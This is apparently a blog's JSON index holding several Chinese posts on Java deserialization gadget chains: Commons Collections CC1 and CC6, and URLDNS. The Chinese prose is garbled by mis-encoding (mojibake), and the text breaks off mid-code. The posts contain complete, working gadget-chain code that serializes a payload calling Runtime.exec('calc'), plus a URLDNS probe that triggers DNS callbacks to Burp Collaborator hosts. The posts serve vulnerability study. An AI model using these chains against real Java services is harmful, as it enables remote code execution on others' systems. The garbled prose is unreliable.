å¥½çš„LazyMapï¼Œä¹‹åæˆ‘ä»¬å†çœ‹ä¸€ä¸‹keyï¼Œå…¶å®è¿™ä¸ªkeyæˆ‘ä»¬æ˜¯å®Œå…¨ä¸ç”¨ç®¡çš„ï¼Œå› ä¸ºCC1çš„æ—¶å€™å·²ç»è®²è¿‡ï¼ŒConstantTransformeræ— è§†äº†è°ƒç”¨æ—¶çš„ä¼ å‚ã€‚ ä¹‹åæˆ‘ä»¬å†çœ‹ä¸€ä¸‹è°è°ƒç”¨äº†getValueæ–¹æ³•ï¼š å®é™…ä¸Šï¼Œè¿˜æ˜¯è¿™ä¸ªç±»é‡Œè¾¹çš„hashCodeæ–¹æ³•ã€‚ 2.HashMapéƒ¨åˆ†çœ‹è§hashCodeæ–¹æ³•ï¼Œæˆ‘ä»¬åˆåˆšå­¦å®ŒURLDNSè¿™æ¡é“¾ï¼Œå®é™…ä¸Šå°±å¾ˆæ˜ç™½äº†ï¼Œç›´æ¥ä¸ŠHashMapæ¢­å“ˆï¼ˆæ—¢èƒ½è°ƒç”¨hashCodeæ–¹æ³•ï¼Œåˆç›´æ¥é‡å†™äº†readObjectæ–¹æ³•ï¼Œç®€ç›´å®Œç¾ï¼‰ï¼š HashMapçš„readObjectæ–¹æ³•ä¸­æœ‰è¿™ä¹ˆä¸€å¥ï¼Œè°ƒç”¨äº†hashæ–¹æ³•ï¼Œè€Œhashæ–¹æ³•å†…åˆ™åˆè°ƒç”¨äº†hashCode: è¿™æ ·æˆ‘ä»¬å°±åªéœ€è¦æ³¨æ„å°†keyä¼ å‚ä¸ºæˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„TiedMapEntryå°±å¥½äº†ã€‚ 3.æ„é€ é“¾æˆ‘ä»¬æŠŠä¸Šè¾¹æ‰€è¯´çš„æŒ‰æµç¨‹ä¸²èµ·æ¥ï¼š 12345678910111213141516171819Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(hashMap);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject(); çœ‹èµ·æ¥ä¸é”™ï¼Œä½†å®Œæˆäº†å—ï¼Ÿ å®é™…ä¸Šæ˜¯æ²¡æœ‰çš„ã€‚æˆ‘ä»¬å‰è¾¹å­¦äº†URLDNSé“¾å¯ä»¥çŸ¥é“ï¼Œå®é™…ä¸Šåœ¨ç»™hashMap putçš„æ—¶å€™å°±å·²ç»è§¦å‘è¿™æ¡é“¾äº†ï¼Œè¿™å€’ä¹Ÿæ²¡å…³ç³»ï¼Œåªè¦ååºåˆ—åŒ–çš„æ—¶å€™èƒ½å†æ¬¡è§¦å‘ä¸€éå°±å¥½äº†ï¼Œä½†å®é™…ä¸Šä¹Ÿä¸è¡Œï¼Œæˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæ ¹æœ¬æ²¡æœ‰è¿›å»ï¼Œè¿™å…¶å®æ˜¯å› ä¸ºä¹‹å‰å·²ç»è§¦å‘è¿‡ä¸€æ¬¡ï¼Œæ‰€ä»¥innermapä¸­å·²ç»å­˜åœ¨è¿™ä¸ªkeyäº†ã€‚ å…¶å®è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥åœ¨åºåˆ—åŒ–ä¹‹å‰åˆ é™¤æ‰è¿™ä¸ªkeyå°±å¥½äº†ã€‚ ç›´æ¥ï¼š 1innerMap.remove(&quot;aaa&quot;); ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ç–‘æƒ‘è¿™é‡Œæœ‰ä¸€ä¸ªå°æ’æ›²ï¼Œæœ¬äººåœ¨å¤ç°çš„æ—¶å€™ï¼Œå¹¶æœªåƒç½‘ä¸Šæ‰€è¯´çš„åœ¨hashMap putçš„æ—¶å€™è°ƒç”¨è¿™æ¡é“¾ï¼Œè€Œæ˜¯åœ¨ 1TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;); è¿™æ—¶å€™å°±å·²ç»è§¦å‘è¿™æ¡é“¾äº†ã€‚ç»è°ƒè¯•ï¼Œçœ‹èµ·æ¥åƒæ˜¯åœ¨ç»™keyå’Œmapèµ‹å€¼çš„æ—¶å€™è¿ç€è§¦å‘äº†ä¸‰æ¬¡ï¼ˆå…¶å®è¿™ä¹Ÿå¾ˆå¥‡æ€ªï¼Œå› ä¸ºkeyå±…ç„¶æ²¡æœ‰å­˜ä¸‹æ¥ï¼Œè€Œæ˜¯åœ¨æœ€åçš„æ—¶å€™å­˜äº†ä¸‹æ¥ï¼Œä½¿å¾—å¹¶æ²¡æœ‰åœ¨putæ–¹æ³•ä¸­è§¦å‘é“¾å­ï¼‰ã€‚ç½‘ä¸Šæœ‰å¸ˆå‚…è¯´æ˜¯IDEAé…ç½®çš„é—®é¢˜ï¼Œä½†ç»è¿‡æµ‹è¯•ï¼Œå¹¶éæ˜¯IDEAè°ƒè¯•å¯¼è‡´çš„toStringç­‰ä¸€ç³»åˆ—æ–¹æ³•çš„è§¦å‘ã€‚ è¿™ä¸ªç–‘æƒ‘ç›®å‰è¿˜æœªè§£å†³ï¼Œä½†å¹¶ä¸å¦¨ç¢ä¹‹åé“¾å­çš„è§¦å‘ã€‚ å·²è§£å†³ï¼Œytggä¹Ÿè¯´æ˜¯IDEAçš„é…ç½®é—®é¢˜ï¼Œä»Šæ—©æ‰“å¼€ç”µè„‘é‡æ–°è¯•äº†ä¸€ä¸‹å°±æˆåŠŸäº†ï¼ŒçŒœæµ‹æ˜¯IDEAçš„ç¼“å­˜é—®é¢˜ï¼Œæ€ªäº‹â€¦â€¦ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ å†è¿›å…¥æ­£æ–‡ï¼Œæˆ‘ä»¬ä¸æƒ³åœ¨åºåˆ—åŒ–ä¹‹å‰è§¦å‘è¿™æ¡é“¾ï¼Œé‚£å°±éœ€è¦æ”¹ä¸€ä¸‹å‰è¾¹çš„æµç¨‹ï¼Œå¹¶åœ¨åºåˆ—åŒ–å‰ç”¨åå°„ç»™æ”¹å›å»ï¼Œå…¶å®æ”¹çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬å¯ä»¥æ”¹tiedMapEntryï¼Œä¹Ÿå¯ä»¥æ”¹innermapï¼Œè¿˜å¯ä»¥æ”¹chainedTransformerã€‚æˆ‘åœ¨è¿™é‡Œæ”¹äº†chainedTransformerï¼š 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);innerMap.remove(&quot;aaa&quot;);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,chainedTransformer);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(hashMap);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject(); è¿™æ ·ä¸€æ¥ï¼ŒCC6å°±å¤§åŠŸå‘Šæˆäº†ã€‚ åæ–‡ä»¥ä¸Šçš„CC6æ˜¯ç™½æ—¥æ¢¦ç»„é•¿è®²çš„ç‰ˆæœ¬ï¼Œå’Œysoserialä¸­çš„CC6çš„å·®åˆ«ä¸ºæœ€ç»ˆçš„readObjectæ–¹æ³•æ‰€å±çš„ç±»ã€‚ä¸Šè¾¹è®²çš„æ˜¯ç”¨çš„HashMapçš„readObjectï¼Œysoserialä¸­ç”¨çš„æ˜¯HashSetçš„readObjectã€‚æ”¹èµ·æ¥ä¹Ÿå¾ˆç®€å•ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);LinkedHashSet set = new LinkedHashSet();set.add(tiedMapEntry);innerMap.remove(&quot;aaa&quot;);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,chainedTransformer);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(set);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:URLDNSé“¾","slug":"JAVAå®‰å…¨URLDNSé“¾","date":"2024-03-16T11:29:12.456Z","updated":"2024-03-16T12:06:31.739Z","comments":true,"path":"2024/03/16/JAVAå®‰å…¨URLDNSé“¾/","link":"","permalink":"http://example.com/2024/03/16/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;16 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;16 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€URLDNSé“¾æ˜¯ysoserialä¸­çš„ä¸€æ¡éå¸¸ç»å…¸çš„é“¾ï¼Œç”±äºå…¶ä¸jdkç‰ˆæœ¬æ— å…³ï¼Œä½¿ç”¨çš„å‡ä¸ºjavaå†…ç½®ç±»ï¼Œå¸¸å¸¸è¢«ç”¨äºæ£€æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™æ¡é“¾æœ¬èº«æ˜¯æ²¡æœ‰ä»€ä¹ˆå±å®³çš„ï¼Œä»…èƒ½å‘èµ·DNSè¯·æ±‚ã€‚ æ­£æ–‡æˆ‘ä»¬å…ˆå»ysoserialä¸­çœ‹ä¸€ä¸‹è¿™æ¡é“¾çš„å®Œæ•´æµç¨‹ï¼š å¯ä»¥çœ‹è§è¿™æ¡é“¾çš„æµç¨‹éå¸¸ç®€å•ï¼Œæˆ‘ä»¬å°±å€’ç€æ¥åˆ†æä¸€éã€‚ 1.URL.hashCode()éƒ¨åˆ†ä¸ºä»€ä¹ˆè¦åˆ©ç”¨URL.hashCode()å‘¢ï¼Ÿæˆ‘ä»¬è¿›å»çœ‹ä¸€ä¸‹ï¼š 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; å¯ä»¥å‘ç°å®ƒçš„hashCode()æ–¹æ³•é‡Œè¾¹è°ƒç”¨äº†URLStreamHandlerçš„hashCode()æ–¹æ³•ï¼Œè€ŒURLStreamHandlerçš„hashCode()æ–¹æ³•åˆ™å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯è§å…¶å°†URLä¼ å…¥åè°ƒç”¨äº†getHostAddress()æ–¹æ³•ï¼Œè€ŒgetHostAddress()æ–¹æ³•åˆ™ä¼šå‘é€DNSè¯·æ±‚å»æŸ¥è¯¢URLçš„ä¸»æœºåï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬ä»ç»ˆç‚¹å¾€ä¸Šå›æº¯ï¼Œå»çœ‹çœ‹HashMapå¦‚ä½•è°ƒç”¨çš„hashCode()æ–¹æ³•ã€‚ 2.HashMap.hash()éƒ¨åˆ†å®ƒè¿™ä¸ªHashMapå¾ˆæœ‰æ„æ€ï¼Œé‡Œè¾¹å‘¢æ¥æ”¶ä¸¤ä¸ªéšæ„çš„å€¼ï¼Œä¸€ä¸ªå½“KEYï¼Œä¸€ä¸ªå½“VALUEã€‚æˆ‘ä»¬è¦æ‰¾HashMapé‡Œè°ƒç”¨hashCode()æ–¹æ³•çš„åœ°æ–¹ï¼Œå¦‚ä¸‹ï¼š ä¹‹åæˆ‘ä»¬å†å¾€ä¸Šæ‰¾åˆ©ç”¨HashMapä¸­hash()æ–¹æ³•çš„åœ°æ–¹ã€‚ 3.HashMap.putVal()éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°HashMapè‡ªèº«çš„put()æ–¹æ³•ä¸­æœ‰putVal()æ–¹æ³•å¯¹hash()æ–¹æ³•è¿›è¡Œäº†è°ƒç”¨ï¼Œè€Œè¯¥æ–¹æ³•åˆ™æ˜¯åœ¨readObject()ä¸­ä¹Ÿæœ‰è°ƒç”¨ï¼š 4.HashMap.readObject()éƒ¨åˆ†å› ä¸ºæˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè§¦å‘readObject()æ–¹æ³•ï¼Œè€ŒHashMapåˆ™å¯¹readObject()æ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†HashMapè¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åååºåˆ—åŒ–è§¦å‘ä¸Šè¿°URLDNSé“¾ã€‚ 5.æ„é€ é“¾ ä»…æŒ‰ä¸Šè¿°æè¿°æ¥çœ‹çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåˆ©ç”¨ä¸Šå›¾ä¸­çš„é“¾è¿›è¡Œè§¦å‘äº†ã€‚ä½†å®é™…ä¸Šï¼Œé€šè¿‡è°ƒè¯•å¯ä»¥å‘ç°ï¼Œæ­¤æ—¶è§¦å‘è¿™æ¡é“¾çš„å¹¶éååºåˆ—åŒ–ï¼Œè€Œæ˜¯åºåˆ—åŒ–ä¹‹å‰çš„ï¼š 1hashMap.put(new URL(&quot;http://d1fq6zzx9q24dt8yandyaqt5awgm4b.burpcollaborator.net&quot;),1); è¿™ä¸ªå°±å¾ˆæœ‰æ„æ€äº†ï¼Œå› ä¸ºput()æ–¹æ³•ä¼šç›´æ¥è°ƒç”¨hash()æ–¹æ³•ï¼Œå¯¼è‡´è¿™æ¡é“¾æ­£å‘æ‰§è¡Œä¸€éï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ˜¯å¦è¿˜ä¼šè§¦å‘å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯NONONO~~~~ å› ä¸ºä»URL.hashCode()æ–¹æ³•ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…¶ç§æœ‰å±æ€§hashCodeä»…åœ¨å€¼ä¸º-1çš„æ—¶å€™ä¼šè¿›è¡Œæ‰§è¡ŒURLStreamHandlerçš„hashCode()æ–¹æ³•ï¼Œè€Œåœ¨æ­£å‘è§¦å‘è¿‡ä¸€æ¬¡ä¹‹åï¼ŒhashCodeå·²ç»è¢«èµ‹å€¼ä¸ºå…¶ä»–å€¼äº†ï¼Œä¸èƒ½å†æ¬¡è§¦å‘ã€‚é‚£ä¹ˆæˆ‘ä»¬æœ‰ä»€ä¹ˆåŠæ³•ä½¿å…¶å€¼åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ”¹å˜å‘¢ï¼Ÿç­”æ¡ˆæ˜¯åå°„ã€‚ åå°„çš„å¼•ç”¨æˆ‘ä»¬æƒ³è¦è¿™æ¡é“¾åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¸è¢«è§¦å‘ï¼Œè€Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±åˆ©ç”¨åå°„ï¼Œå°†å…¶åœ¨åºåˆ—åŒ–ä¹‹å‰ï¼Œä¹Ÿå°±æ˜¯putçš„æ—¶å€™hashCodeèµ‹å€¼ä¸ºå…¶ä»–ï¼Œè€Œåœ¨åºåˆ—åŒ–å‰èµ‹å€¼ä¸º-1ï¼Œä½¿å…¶ååºåˆ—åŒ–æ­£å¥½è§¦å‘ã€‚ é“¾å­å¦‚ä¸‹ï¼š 1234567891011121314HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL,Integer&gt;();URL url = new URL(&quot;http://7ltkbk2jj0pgndcc33oyxbsy1p7fv4.burpcollaborator.net&quot;);Class c = url.getClass();Field hashcode = c.getDeclaredField(&quot;hashCode&quot;);hashcode.setAccessible(true);//é’ˆå¯¹ç§æœ‰æ–¹æ³•å¿…å¤‡hashcode.set(url,1);hashMap.put(url,1);hashcode.set(url,-1);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));oos.writeObject(hashMap);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));ois.readObject(); ä¹‹åæˆ‘ä»¬ä¾¿å¯çœ‹åˆ°æ­£å¸¸çš„DNSè¯·æ±‚äº†ï¼š","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:CC1é“¾","slug":"JAVAå®‰å…¨CC1é“¾","date":"2024-02-23T09:27:52.423Z","updated":"2024-08-24T03:27:38.444Z","comments":true,"path":"2024/02/23/JAVAå®‰å…¨CC1é“¾/","link":"","permalink":"http://example.com/2024/02/23/JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;2&#x2F;23 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;2&#x2F;23 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹æ­£å°„å’Œåå°„ã€‚ JAVAä¸­ï¼Œå¦‚æœæˆ‘ä»¬è¦è°ƒç”¨èµ·è®¡ç®—å™¨ï¼Œæ­£å¸¸çš„å‘½ä»¤æ‰§è¡Œä¸ºï¼š 1Runtime.getRuntime().exec(&quot;calc&quot;); ä½†ä¸Šè¾¹ä½¿ç”¨çš„æ˜¯æ­£å°„ï¼Œæ˜¯æ— æ³•åºåˆ—åŒ–å†™å…¥æ–‡ä»¶ä¸­çš„ï¼Œå¦‚æœè¦å­˜å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨åå°„æ¥å®ç°ï¼š 1234Runtime r = Runtime.getRuntime();//å®ä¾‹åŒ–Runtimeç±»Class c = r.getClass();//è·å–ç±»åŸå‹ï¼Œè¿™é‡Œå’Œæ­£å°„ä¸åŒï¼Œæ–¹æ³•ä»ç±»ä¸­è·å–Method m = c.getMethod(&quot;exec&quot;,String.class);//ä»ç±»ä¸­è·å–execæ–¹æ³•m.invoke(r,&quot;calc&quot;);//ç›¸å½“äºr.exec(&quot;calc&quot;) æ‰€è°“çš„CCé“¾ï¼Œå®é™…ä¸Šå°±æ˜¯é’ˆå¯¹Apache Commons Collectionsç»„ä»¶çš„payloadï¼Œå…¶æ ¸å¿ƒä¾¿æ˜¯åˆ©ç”¨JAVAçš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ã€‚ æ­£æ–‡é’ˆå¯¹JAVAçš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ€è·¯å¤§è‡´å’Œphpçš„ååºåˆ—åŒ–æ¼æ´ä¸€è‡´ï¼Œå°±æ˜¯ä»ç»ˆç‚¹å¾€å‰æ‰¾ï¼Œé¦–å…ˆç¡®å®šä¸€ä¸ªè°ƒç”¨äº†å±é™©æ–¹æ³•çš„ç±»ï¼Œå¹¶ä¸”ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£ï¼Œç„¶åé€æ­¥æº¯æºï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªé‡å†™äº†readObjectæ–¹æ³•çš„ç±»ï¼Œå¹¶ä¸”ç¬¦åˆæ¡ä»¶ï¼Œé‚£ä¹ˆå°±æˆåŠŸäº†ã€‚ ä¸‹é¢æˆ‘ä»¬ä»¥CC1é“¾ä¸ºä¾‹ï¼Œè¿›è¡Œåˆ†æã€‚ 1.ç»ˆç‚¹â€“InvokerTransformerç±»CC1é“¾çš„æºå¤´ä¾¿æ˜¯InvokerTransformerç±»ï¼Œå…³é”®åœ¨äºå…¶æ„é€ å™¨å’Œç»§æ‰¿äº†Transformeræ¥å£çš„transformæ–¹æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®ƒçš„æºç ï¼š 123456789101112131415161718192021222324public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125;public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; ä»æ„é€ å™¨ä¸­å¯ä»¥å¾—çŸ¥å…¶ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œè€Œæ–¹æ³•transformæ˜¯ä¸æ˜¯æœ‰ç‚¹çœ¼ç†Ÿï¼Ÿæ²¡é”™ï¼Œè¿™å°±æ˜¯åœ¨å‰è¨€ä¸­è®²åˆ°çš„åå°„ã€‚ æˆ‘ä»¬å°è¯•åˆ©ç”¨InvokerTransformerç±»æ‰§è¡Œä¹‹å‰çš„å‘½ä»¤ï¼š 123456 Runtime r = Runtime.getRuntime();// Class c = r.getClass();// Method m = c.getMethod(&quot;exec&quot;,String.class);// m.invoke(r,&quot;calc&quot;);ä¸Šè¾¹è¿™ä¸‰è¡Œæ³¨é‡Šçš„ä»£ç ç”±ä¸‹è¾¹è¿™ä¸¤è¡Œä»£æ›¿ InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(r); æ‰§è¡Œä¸Šè¿°ä»£ç ï¼Œå‘ç°æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚ è¿™æ ·ï¼Œç»ˆç‚¹å°±æ‰¾åˆ°äº†ï¼Œæˆ‘ä»¬ä¾¿éœ€è¦è¿›è¡Œæº¯æºï¼Œå¯»æ‰¾ä¸Šä¸€ç«™ã€‚ 2.æº¯æº2.1 TransformedMapç±»æˆ‘ä»¬å‘ä¸Šæ‰¾èƒ½å¤Ÿåˆ©ç”¨transformæ–¹æ³•çš„ç±»ï¼š å‘ç°æœ‰å¾ˆå¤šï¼Œäºæ˜¯ä¾¿ä¸€ä¸ªä¸ªç‚¹å¼€æŸ¥çœ‹ï¼Œæœ€ç»ˆå‘ç°LazyMapï¼ŒTransformedMapå’ŒDefaultedMapå­˜åœ¨åˆ©ç”¨ç‚¹ï¼Œæˆ‘ä»¬å…ˆåªçœ‹TransformedMapè¿™ä¸ªç±»ã€‚ 123456789protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;//æ„é€ å™¨ super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125;protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);//æˆ‘ä»¬åªéœ€è¦è®©valueTransformerä¸ºInvokerTransformerå³å¯&#125; ç„¶è€Œï¼ŒTransformerMapçš„checkSerValueæ–¹æ³•ä»¥åŠå…¶æ„é€ å™¨éƒ½æ˜¯protectedç±»å‹çš„ï¼Œåªèƒ½åœ¨å†…éƒ¨è®¿é—®ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªä½¿å…¶å®ä¾‹åŒ–çš„æ–¹æ³•ï¼Œç´§æ¥ç€ä¾¿çœ‹åˆ°äº†TransformedMapä¸­publicå±æ€§çš„decorateæ–¹æ³•ï¼š 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨TransformedMapç±»çš„decorateæ–¹æ³•ï¼Œè®©å…¶å®ä¾‹åŒ–ï¼Œä¹‹åå†æƒ³åŠæ³•è§¦å‘checkSetValueæ–¹æ³•ã€‚ 2.2 Mapéå†æˆ‘ä»¬æŸ¥æ‰¾è°ƒç”¨è¿‡checkSetValueæ–¹æ³•çš„åœ°æ–¹ï¼Œå‘ç°TransformedMapçš„çˆ¶ç±»AbstractInputCheckedMapDecoratoræ°å¥½è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œä¸”å…¶ä¸­çš„setValueæ–¹æ³•ä¸ºpublicç±»å‹ 1234567891011121314static class MapEntry extends AbstractMapEntryDecorator &#123;//AbstractInputCheckedMapDecoratorçš„å‰¯ç±»MapEntry private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; è€ŒMapEntryç»§æ‰¿äº†AbstractMapEntryDecoratorç±»ï¼ŒAbstractMapEntryDecoratorç±»ä¸­ç»§æ‰¿äº†Map.Entryæ¥å£ï¼Œå¯è¿›è¡ŒMapéå† å› æ­¤æˆ‘ä»¬é€šè¿‡Mapéå†æ—¶å³å¯è°ƒç”¨TransformedMapçš„çˆ¶ç±»AbstractInputCheckedMapDecoratorä¸­çš„setValueæ–¹æ³•æ¥è§¦å‘TransformedMapä¸­çš„checkSetValueæ–¹æ³•ã€‚ 12345678Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new 